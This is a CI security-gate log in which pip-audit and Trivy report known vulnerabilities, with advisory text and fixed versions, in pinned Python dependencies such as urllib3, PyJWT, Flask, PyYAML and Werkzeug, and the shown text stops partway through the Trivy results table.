+urllib3  1.26.4  PYSEC-2026-1995     1.26.19,2.2.2 When using urllib3's proxy support with `ProxyManager`, the `Proxy-Authorization` header is only sent to the configured proxy, as expected.  However, when sending HTTP requests *without* using urllib3's proxy support, it's possible to accidentally configure the `Proxy-Authorization` header even though it won't have any effect as the request is not using a forwarding proxy or a tunneling proxy. In those cases, urllib3 doesn't treat the `Proxy-Authorization` HTTP header as one carrying authentication material and thus doesn't strip the header on cross-origin redirects.  Because this is a highly unlikely scenario, we believe the severity of this vulnerability is low for almost all users. Out of an abundance of caution urllib3 will automatically strip the `Proxy-Authorization` header during cross-origin redirects to avoid the small chance that users are doing this on accident.  Users should use urllib3's proxy support or disable automatic redirects to achieve safe processing of the `Proxy-Authorization` header, but we still decided to strip the header by default in order to further protect users who aren't using the correct approach.  ## Affected usages  We believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:  * Setting the `Proxy-Authorization` header without using urllib3's built-in proxy support. * Not disabling HTTP redirects. * Either not using an HTTPS origin server or for the proxy or target origin to redirect to a malicious origin.  ## Remediation  * Using the `Proxy-Authorization` header with urllib3's `ProxyManager`. * Disabling HTTP redirects using `redirects=False` when sending requests. * Not using the `Proxy-Authorization` header.
+urllib3  1.26.4  PYSEC-2026-1994     2.6.0         ### Impact  urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.  When streaming a compressed response, urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). The library must read compressed data from the network and decompress it until the requested chunk size is met. Any resulting decompressed data that exceeds the requested amount is held in an internal buffer for the next read operation.  The decompression logic could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This can result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data; CWE-409) on the client side, even if the application only requested a small chunk of data.   ### Affected usages  Applications and libraries using urllib3 version 2.5.0 and earlier to stream large compressed responses or content from untrusted sources.  `stream()`, `read(amt=256)`, `read1(amt=256)`, `read_chunked(amt=256)`, `readinto(b)` are examples of `urllib3.HTTPResponse` method calls using the affected logic unless decoding is disabled explicitly.   ### Remediation  Upgrade to at least urllib3 v2.6.0 in which the library avoids decompressing data that exceeds the requested amount.  If your environment contains a package facilitating the Brotli encoding, upgrade to at least Brotli 1.2.0 or brotlicffi 1.2.0.0 too. These versions are enforced by the `urllib3[brotli]` extra in the patched versions of urllib3.   ### Credits  The issue was reported by @Cycloctane. Supplemental information was provided by @stamparm during a security audit performed by [7ASecurity](https://7asecurity.com/) and facilitated by [OSTIF](https://ostif.org/).
+urllib3  1.26.4  PYSEC-2026-1996     2.6.3         ### Impact  urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.6.2/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.  urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). When using the streaming API, the library decompresses only the necessary bytes, enabling partial content consumption.  However, for HTTP redirect responses, the library would read the entire response body to drain the connection and decompress the content unnecessarily. This decompression occurred even before any read methods were called, and configured read limits did not restrict the amount of decompressed data. As a result, there was no safeguard against decompression bombs. A malicious server could exploit this to trigger excessive resource consumption on the client (high CPU usage and large memory allocations for decompressed data; CWE-409).  ### Affected usages  Applications and libraries using urllib3 version 2.6.2 and earlier to stream content from untrusted sources by setting `preload_content=False` when they do not disable redirects.   ### Remediation  Upgrade to at least urllib3 v2.6.3 in which the library does not decode content of redirect responses when `preload_content=False`.  If upgrading is not immediately possible, disable [redirects](https://urllib3.readthedocs.io/en/2.6.2/user-guide.html#retrying-requests) by setting `redirect=False` for requests to untrusted source.
+urllib3  1.26.4  PYSEC-2026-4177     2.8.0         ## Impact  urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.7.0/advanced-usage.html#streaming-and-i-o) is designed for efficiently handling large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once. When decoding a [chunked-transfer-encoded response](https://httpwg.org/specs/rfc9112.html#chunked.encoding), this API reads each chunk's size field by buffering until it sees `\n` or EOF.  A malicious HTTP server can return `Transfer-Encoding: chunked` and then send a very long run of bytes without any newline, causing the streaming client to buffer that entire run before urllib3 can reject the chunk size as invalid and allocate more memory than intended.  To fix the issue, we'll reject chunk-size fields larger than 65536 bytes, as already done in the non-streaming case, which is currently handled by the Python standard library. Note that this only applies to reading the chunk-size field, not the chunk data, which is already handled correctly. Thus, there shouldn't be any impact for non-malicious servers.  ## Affected usages  Applications and libraries using urllib3 versions earlier than 2.8.0 may be affected when streaming a chunked response from untrusted sources. Specifically, this affects the [read_chunked()](https://urllib3.readthedocs.io/en/stable/reference/urllib3.response.html#urllib3.response.BaseHTTPResponse.read_chunked) and [stream()](https://urllib3.readthedocs.io/en/stable/reference/urllib3.response.html#urllib3.response.BaseHTTPResponse.stream) methods of the HTTPResponse object.  This also affects requests streaming API, which uses urllib3 under the hood.  ## Remediation  Upgrade to urllib3 version 2.8.0 or later, where chunk-size fields larger than 65536 will be rejected. If upgrading is not immediately possible, consider reading the response at once using the [read()](https://urllib3.readthedocs.io/en/stable/reference/urllib3.response.html#urllib3.response.BaseHTTPResponse.read) method.
+urllib3  1.26.4  PYSEC-2026-4175     2.8.0         ## Impact  urllib3 supports configuring TLS independently for an HTTPS proxy and the target server.  `proxy_ssl_context`, `proxy_assert_hostname`, and `proxy_assert_fingerprint` configure the TLS connection to the proxy. `ssl_context` and the other target-specific TLS parameters configure the connection to the target server.  In urllib3 versions 1.26.0 through 2.7.0, these configurations were not consistently separated. Depending on the proxy mode, urllib3 could:  1. Ignore `proxy_ssl_context` and use the target server's SSL context for the TLS connection to an HTTPS forwarding proxy. 2. Override the HTTPS proxy's certificate-verification policy with the target server's certificate-verification policy. 3. Apply target-specific SNI, hostname assertions, certificate fingerprint assertions, or TLS client credentials to the TLS connection to an HTTPS forwarding proxy.  In particular, configuring `cert_reqs="CERT_NONE"` for a target server could overwrite the `verify_mode` of the SSL context configured for the HTTPS proxy. This modification occurred in place and persisted on the context object, potentially disabling proxy certificate verification for later connections that reused the same context.  An attacker able to intercept the connection to an HTTPS proxy may be able to impersonate the proxy when the effective proxy TLS configuration disables certificate verification or otherwise accepts the attacker's certificate. This may occur, for example, when the target server's trust or identity policy is incorrectly applied to the proxy connection.  When HTTPS forwarding is enabled, an impersonated proxy can observe or modify forwarded requests and responses, potentially exposing credentials, authentication tokens, request bodies, response data, and other sensitive information.  A TLS client certificate intended for the target server may also be presented to the proxy or to an attacker impersonating it. This can disclose the client's identity and provide proof of possession of the corresponding private key. The private key itself is not transmitted during the TLS handshake.  In CONNECT tunneling mode, impersonating the HTTPS proxy does not by itself defeat the separate end-to-end TLS connection between the client and the target server.  ## Affected Usages  Code using urllib3 versions 1.26.0 through 2.7.0 may be affected in any of the following cases.  ### 1. The target SSL context is used for an HTTPS forwarding proxy  HTTPS requests are forwarded through an HTTPS proxy with `use_forwarding_for_https=True`, and `proxy_ssl_context` is configured for the proxy.  urllib3 may ignore `proxy_ssl_context` and use the target server's `ssl_context` for the proxy TLS handshake. The proxy may therefore be verified using the target server's trust and certificate policy instead of the policy explicitly configured for the proxy.  ### 2. The target verification policy overrides the proxy policy  An HTTPS proxy is configured with `proxy_ssl_context`, while the target server uses a different certificate-verification policy.  urllib3 may apply the target server's `cert_reqs` value to the proxy SSL context. For example, setting `cert_reqs="CERT_NONE"` for the target server may also disable certificate verification for the HTTPS proxy, even when `proxy_ssl_context` was configured to require verification.  This issue can affect the TLS connection to an HTTPS proxy in both forwarding and CONNECT tunneling configurations.  ### 3. A mutated proxy SSL context is reused  The same SSL context is reused as `proxy_ssl_context` across multiple connections, and certificate verification is disabled for one target server.  urllib3 may modify the proxy SSL context's `verify_mode` in place. Later connections that reuse the same context may therefore connect to the HTTPS proxy without certificate verification.  ### 4. Target-specific TLS identity or credentials are applied to the proxy  HTTPS requests are forwarded through an HTTPS proxy with `use_forwarding_for_https=True`, and target-specific SNI, hostname assertions, certificate fingerprint assertions, or TLS client credentials are configured.  urllib3 may apply these target-specific settings to the proxy TLS handshake. This may cause urllib3 to:  - send SNI intended for the target server to the proxy; - verify the proxy using a hostname or certificate fingerprint intended for the target server; or - present a TLS client certificate intended for the target server to the proxy.  Code connecting through a plain HTTP proxy does not establish a TLS connection to the proxy and is not affected by this issue.  ## Remediation  Upgrade to urllib3 2.8.0 or later.  urllib3 2.8.0 independently applies the explicitly configured `proxy_ssl_context` and proxy-specific certificate assertions to the HTTPS proxy connection. Target-specific SNI, certificate assertions, and TLS client certificate parameters are no longer applied to the HTTPS proxy handshake.  For backward compatibility, when an HTTPS proxy is used with `use_forwarding_for_https=True` and `proxy_ssl_context` is not provided, urllib3 2.8.0 continues to use `ssl_context` for the TLS connection to the proxy. This configuration emits a `FutureWarning`. In urllib3 3.0, passing `ssl_context` with `use_forwarding_for_https=True` for an HTTPS proxy will raise an error. Applications should use `proxy_ssl_context` to configure TLS for an HTTPS forwarding proxy.  The fixes were implemented in commits b6447295fff7b38fdffc67e0df9712d60cef3cc3 and 07408cec79d1856d81bb42c74a904a24fdb9e465.
+===== job pip-audit-gate: failed (exit 1)
+
+===== job trivy-gate (stage security, image aquasec/trivy:latest) =====
+2026-11-18T12:35:20Z	INFO	[vulndb] Need to update DB
+2026-11-18T12:35:20Z	INFO	[vulndb] Downloading vulnerability DB...
+2026-11-18T12:35:20Z	INFO	[vulndb] Downloading artifact...	repo="mirror.gcr.io/aquasec/trivy-db:2"
+143.24 KiB / 133.85 MiB [>___________________________________________________________] 0.10% ? p/s ?447.24 KiB / 133.85 MiB [>___________________________________________________________] 0.33% ? p/s ?1.39 MiB / 133.85 MiB [>_____________________________________________________________] 1.04% ? p/s ?2.48 MiB / 133.85 MiB [>________________________________________________] 1.86% 3.90 MiB p/s ETA 33s6.70 MiB / 133.85 MiB [-->______________________________________________] 5.01% 3.90 MiB p/s ETA 32s11.30 MiB / 133.85 MiB [---->___________________________________________] 8.44% 3.90 MiB p/s ETA 31s14.55 MiB / 133.85 MiB [----->_________________________________________] 10.87% 4.95 MiB p/s ETA 24s18.70 MiB / 133.85 MiB [------>________________________________________] 13.97% 4.95 MiB p/s ETA 23s19.73 MiB / 133.85 MiB [------>________________________________________] 14.74% 4.95 MiB p/s ETA 23s23.55 MiB / 133.85 MiB [-------->______________________________________] 17.59% 5.60 MiB p/s ETA 19s27.90 MiB / 133.85 MiB [--------->_____________________________________] 20.84% 5.60 MiB p/s ETA 18s32.02 MiB / 133.85 MiB [----------->___________________________________] 23.92% 5.60 MiB p/s ETA 18s32.58 MiB / 133.85 MiB [----------->___________________________________] 24.34% 6.21 MiB p/s ETA 16s38.18 MiB / 133.85 MiB [------------->_________________________________] 28.52% 6.21 MiB p/s ETA 15s42.40 MiB / 133.85 MiB [-------------->________________________________] 31.68% 6.21 MiB p/s ETA 14s46.40 MiB / 133.85 MiB [---------------->______________________________] 34.66% 7.29 MiB p/s ETA 11s49.65 MiB / 133.85 MiB [----------------->_____________________________] 37.09% 7.29 MiB p/s ETA 11s53.87 MiB / 133.85 MiB [------------------>____________________________] 40.24% 7.29 MiB p/s ETA 10s57.87 MiB / 133.85 MiB [-------------------->___________________________] 43.23% 8.06 MiB p/s ETA 9s59.33 MiB / 133.85 MiB [--------------------->__________________________] 44.33% 8.06 MiB p/s ETA 9s63.33 MiB / 133.85 MiB [---------------------->_________________________] 47.32% 8.06 MiB p/s ETA 8s67.71 MiB / 133.85 MiB [------------------------>_______________________] 50.59% 8.59 MiB p/s ETA 7s71.71 MiB / 133.85 MiB [------------------------->______________________] 53.58% 8.59 MiB p/s ETA 7s75.74 MiB / 133.85 MiB [--------------------------->____________________] 56.59% 8.59 MiB p/s ETA 6s77.18 MiB / 133.85 MiB [--------------------------->____________________] 57.66% 9.06 MiB p/s ETA 6s79.96 MiB / 133.85 MiB [---------------------------->___________________] 59.74% 9.06 MiB p/s ETA 5s84.87 MiB / 133.85 MiB [------------------------------>_________________] 63.41% 9.06 MiB p/s ETA 5s88.87 MiB / 133.85 MiB [------------------------------->________________] 66.39% 9.73 MiB p/s ETA 4s92.99 MiB / 133.85 MiB [--------------------------------->______________] 69.48% 9.73 MiB p/s ETA 4s97.27 MiB / 133.85 MiB [---------------------------------->_____________] 72.67% 9.73 MiB p/s ETA 3s102.18 MiB / 133.85 MiB [----------------------------------->__________] 76.34% 10.53 MiB p/s ETA 3s106.43 MiB / 133.85 MiB [------------------------------------>_________] 79.52% 10.53 MiB p/s ETA 2s108.15 MiB / 133.85 MiB [------------------------------------->________] 80.80% 10.53 MiB p/s ETA 2s115.27 MiB / 133.85 MiB [--------------------------------------->______] 86.12% 11.26 MiB p/s ETA 1s119.58 MiB / 133.85 MiB [----------------------------------------->____] 89.35% 11.26 MiB p/s ETA 1s119.90 MiB / 133.85 MiB [----------------------------------------->____] 89.58% 11.26 MiB p/s ETA 1s125.71 MiB / 133.85 MiB [------------------------------------------->__] 93.92% 11.66 MiB p/s ETA 0s129.58 MiB / 133.85 MiB [-------------------------------------------->_] 96.82% 11.66 MiB p/s ETA 0s130.27 MiB / 133.85 MiB [-------------------------------------------->_] 97.33% 11.66 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [-------------------------------------------->] 100.00% 11.78 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [-------------------------------------------->] 100.00% 11.78 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [-------------------------------------------->] 100.00% 11.78 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [-------------------------------------------->] 100.00% 11.02 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [-------------------------------------------->] 100.00% 11.02 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [-------------------------------------------->] 100.00% 11.02 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [-------------------------------------------->] 100.00% 10.31 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [-------------------------------------------->] 100.00% 10.31 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [-------------------------------------------->] 100.00% 10.31 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 9.65 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 9.65 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 9.65 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 9.02 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 9.02 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 9.02 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 8.44 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 8.44 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 8.44 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 7.90 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 7.90 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 7.90 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 7.39 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 7.39 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 7.39 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 6.91 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 6.91 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 6.91 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 6.46 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 6.46 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 6.46 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 6.05 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 6.05 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 6.05 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 5.66 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 5.66 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 5.66 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 5.29 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 5.29 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 5.29 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 4.95 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 4.95 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 4.95 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 4.63 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 4.63 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 4.63 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 4.33 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 4.33 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 4.33 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 4.05 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 4.05 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 4.05 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 3.79 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 3.79 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 3.79 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 3.55 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 3.55 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 3.55 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 3.32 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 3.32 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 3.32 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 3.10 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 3.10 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 3.10 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 2.90 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 2.90 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 2.90 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 2.72 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 2.72 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 2.72 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 2.54 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 2.54 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 2.54 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 2.38 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 2.38 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 2.38 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 2.22 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 2.22 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 2.22 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 2.08 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 2.08 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 2.08 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 1.95 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 1.95 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 1.95 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 1.82 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 1.82 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [--------------------------------------------->] 100.00% 1.82 MiB p/s ETA 0s133.85 MiB / 133.85 MiB [-------------------------------------------------] 100.00% 5.34 MiB p/s 25s2026-11-18T12:35:46Z	INFO	[vulndb] Artifact successfully downloaded	repo="mirror.gcr.io/aquasec/trivy-db:2"
+2026-11-18T12:35:46Z	INFO	[vuln] Vulnerability scanning is enabled
+2026-11-18T12:35:46Z	WARN	[pip] Unable to find python `site-packages` directory. License detection is skipped.	err="unable to find path to Python executable"
+2026-11-18T12:35:46Z	INFO	Number of language-specific files	num=1
+2026-11-18T12:35:46Z	INFO	[pip] Detecting vulnerabilities...
+2026-11-18T12:35:47Z	INFO	[vuln] Vulnerability scanning is enabled
+2026-11-18T12:35:47Z	WARN	[pip] Unable to find python `site-packages` directory. License detection is skipped.	err="unable to find path to Python executable"
+2026-11-18T12:35:47Z	INFO	Number of language-specific files	num=1
+2026-11-18T12:35:47Z	INFO	[pip] Detecting vulnerabilities...
+
+Report Summary
+
+┌──────────────────┬──────┬─────────────────┐
+│      Target      │ Type │ Vulnerabilities │
+├──────────────────┼──────┼─────────────────┤
+│ requirements.txt │ pip  │       18        │
+└──────────────────┴──────┴─────────────────┘
+Legend:
+- '-': Not scanned
+- '0': Clean (no security findings detected)
+
+
+requirements.txt (pip)
+======================
+Total: 18 (HIGH: 16, CRITICAL: 2)
+
+┌──────────┬─────────────────────┬──────────┬────────┬───────────────────┬────────────────┬──────────────────────────────────────────────────────────────┐
+│ Library  │    Vulnerability    │ Severity │ Status │ Installed Version │ Fixed Version  │                            Title                             │
+├──────────┼─────────────────────┼──────────┼────────┼───────────────────┼────────────────┼──────────────────────────────────────────────────────────────┤
+│ Flask    │ CVE-2023-30861      │ HIGH     │ fixed  │ 2.2.2             │ 2.3.2, 2.2.5   │ flask: Possible disclosure of permanent session cookie due   │
+│          │                     │          │        │                   │                │ to missing Vary: Cookie...                                   │
+│          │                     │          │        │                   │                │ https://avd.aquasec.com/nvd/cve-2023-30861                   │
+├──────────┼─────────────────────┼──────────┤        ├───────────────────┼────────────────┼──────────────────────────────────────────────────────────────┤
+│ PyJWT    │ CVE-2026-102268     │ CRITICAL │        │ 1.7.1             │ 2.14.0         │ pyjwt: PyJWT: Authentication bypass via improper public key  │
+│          │                     │          │        │                   │                │ validation                                                   │
+│          │                     │          │        │                   │                │ https://avd.aquasec.com/nvd/cve-2026-102268                  │
+│          ├─────────────────────┼──────────┤        │                   ├────────────────┼──────────────────────────────────────────────────────────────┤
+│          │ CVE-2022-29217      │ HIGH     │        │                   │ 2.4.0          │ python-jwt: Key confusion through non-blocklisted public key │
+│          │                     │          │        │                   │                │ formats                                                      │
+│          │                     │          │        │                   │                │ https://avd.aquasec.com/nvd/cve-2022-29217                   │
+│          ├─────────────────────┤          │        │                   ├────────────────┼──────────────────────────────────────────────────────────────┤
+│          │ CVE-2026-102267     │          │        │                   │ 2.14.0         │ pyjwt: pyjwt: Verification key substitution via unvalidated  │
+│          │                     │          │        │                   │                │ JWKS redirects                                               │
+│          │                     │          │        │                   │                │ https://avd.aquasec.com/nvd/cve-2026-102267                  │
+│          ├─────────────────────┤          │        │                   ├────────────────┼──────────────────────────────────────────────────────────────┤
+│          │ CVE-2026-32597      │          │        │                   │ 2.12.0         │ pyjwt: PyJWT accepts unknown `crit` header extensions (RFC   │
+│          │                     │          │        │                   │                │ 7515 §4.1.11 MUST violation)...                              │
+│          │                     │          │        │                   │                │ https://avd.aquasec.com/nvd/cve-2026-32597                   │
+│          ├─────────────────────┤          │        │                   ├────────────────┼──────────────────────────────────────────────────────────────┤
+│          │ CVE-2026-48526      │          │        │                   │ 2.13.0         │ python-pyjwt: PyJWT: Authentication bypass due to forged     │
+│          │                     │          │        │                   │                │ JSON Web Tokens                                              │
+│          │                     │          │        │                   │                │ https://avd.aquasec.com/nvd/cve-2026-48526                   │
+│          ├─────────────────────┤          │        │                   ├────────────────┼──────────────────────────────────────────────────────────────┤
+│          │ GHSA-pxh4-856f-4h89 │          │        │                   │ 2.14.0         │ PyJWT: HS256/384/512 verify accepts empty HMAC key via oct   │
+│          │                     │          │        │                   │                │ JWK (PyJWK/PyJWKClient) enabling...                          │
+│          │                     │          │        │                   │                │ https://github.com/advisories/GHSA-pxh4-856f-4h89            │
+├──────────┼─────────────────────┼──────────┤        ├───────────────────┼────────────────┼──────────────────────────────────────────────────────────────┤
+│ PyYAML   │ CVE-2020-14343      │ CRITICAL │        │ 5.3.1             │ 5.4            │ PyYAML: incomplete fix for CVE-2020-1747                     │
+│          │                     │          │        │                   │                │ https://avd.aquasec.com/nvd/cve-2020-14343                   │
+├──────────┼─────────────────────┼──────────┤        ├───────────────────┼────────────────┼──────────────────────────────────────────────────────────────┤
+│ Werkzeug │ CVE-2023-25577      │ HIGH     │        │ 2.2.2             │ 2.2.3          │ python-werkzeug: high resource usage when parsing multipart  │
+│          │                     │          │        │                   │                │ form data with many fields...                                │
+│          │                     │          │        │                   │                │ https://avd.aquasec.com/nvd/cve-2023-25577                   │
+│          ├─────────────────────┤          │        │                   ├────────────────┼──────────────────────────────────────────────────────────────┤
+│          │ CVE-2024-34069      │          │        │                   │ 3.0.3          │ python-werkzeug: user may execute code on a developer's      │
+│          │                     │          │        │                   │                │ machine                                                      │
+│          │                     │          │        │                   │                │ https://avd.aquasec.com/nvd/cve-2024-34069                   │
+├──────────┼─────────────────────┤          │        ├───────────────────┼────────────────┼──────────────────────────────────────────────────────────────┤
+│ urllib3  │ CVE-2021-33503      │          │        │ 1.26.4            │ 1.26.5         │ python-urllib3: ReDoS in the parsing of authority part of    │
+│          │                     │          │        │                   │                │ URL                                                          │
+│          │                     │          │        │                   │                │ https://avd.aquasec.com/nvd/cve-2021-33503                   │
+│          ├─────────────────────┤          │        │                   ├────────────────┼──────────────────────────────────────────────────────────────┤
+│          │ CVE-2023-43804      │          │        │                   │ 2.0.6, 1.26.17 │ python-urllib3: Cookie request header isn't stripped during  │
+│          │                     │          │        │                   │                │ cross-origin redirects                                       │
+│          │                     │          │        │                   │                │ https://avd.aquasec.com/nvd/cve-2023-43804                   │
+│          ├─────────────────────┤          │        │                   ├────────────────┼──────────────────────────────────────────────────────────────┤
+│          │ CVE-2025-66418      │          │        │                   │ 2.6.0          │ urllib3: urllib3: Unbounded decompression chain leads to     │
+│          │                     │          │        │                   │                │ resource exhaustion                                          │
+│          │                     │          │        │                   │                │ https://avd.aquasec.com/nvd/cve-2025-66418                   │
+│          ├─────────────────────┤          │        │                   │                ├──────────────────────────────────────────────────────────────┤
+│          │ CVE-2025-66471      │          │        │                   │                │ urllib3: urllib3 Streaming API improperly handles highly     │
+│          │                     │          │        │                   │                │ compressed data                                              │
+│          │                     │          │        │                   │                │ https://avd.aquasec.com/nvd/cve-2025-66471                   │
+│          ├─────────────────────┤          │        │                   ├────────────────┼──────────────────────────────────────────────────────────────┤
+│          │ CVE-2026-21441      │          │        │                   │ 2.6.3          │ urllib3: urllib3 vulnerable to decompression-bomb safeguard  │
+│          │                     │          │        │                   │                │ bypass when following HTTP redirects (streaming...           │
+│          │                     │          │        │                   │                │ https://avd.aquasec.com/nvd/cve-2026-21441                   │
+│          ├─────────────────────┤          │        │                   ├────────────────┼──────────────────────────────────────────────────────────────┤
+│          │ CVE-2026-44431      │          │        │                   │ 2.7.0          │ urllib3: urllib3: Information disclosure via cross-origin    │
+│          │                     │          │        │                   │                │ redirects forwarding sensitive headers                       │
+│          │                     │          │        │                   │                │ https://avd.aquasec.com/nvd/cve-2026-44431                   │
+│          ├─────────────────────┤          │        │                   ├────────────────┼──────────────────────────────────────────────────────────────┤
+│          │ CVE-2026-97687      │          │        │                   │ 2.8.0          │ urllib3: urllib3: Traffic interception via HTTPS proxy TLS   │
+│          │                     │          │        │                   │                │ configuration override                                       │
+│          │                     │          │        │                   │                │ https://avd.aquasec.com/nvd/cve-2026-97687                   │
+│          ├─────────────────────┤          │        │                   │                ├──────────────────────────────────────────────────────────────┤
